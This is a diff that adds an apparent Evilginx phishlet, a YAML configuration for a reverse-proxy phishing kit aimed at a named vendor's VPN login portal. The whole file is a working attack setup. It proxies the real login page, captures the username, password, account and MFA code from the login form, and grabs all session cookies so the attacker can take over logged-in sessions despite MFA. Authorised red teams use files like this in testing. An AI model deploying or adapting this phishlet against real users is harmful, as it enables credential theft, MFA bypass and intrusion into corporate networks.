@@ -1,0 +1,29 @@
+author: '@JustinPerdok'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'myvpn', orig_sub: 'myvpn', domain: 'catonetworks.com', session: true, is_landing: true}
+sub_filters: []
+auth_tokens:
+  - domain: 'myvpn.catonetworks.com'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: 'user'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'account'
+      search: '(.*)'
+      type: 'post'
+    - key: 'mfaCode'
+      search: '(.*)'
+      type: 'post'
+auth_urls:
+  - '/'
+login:
+  domain: 'myvpn.catonetworks.com'
+  path: '/login'
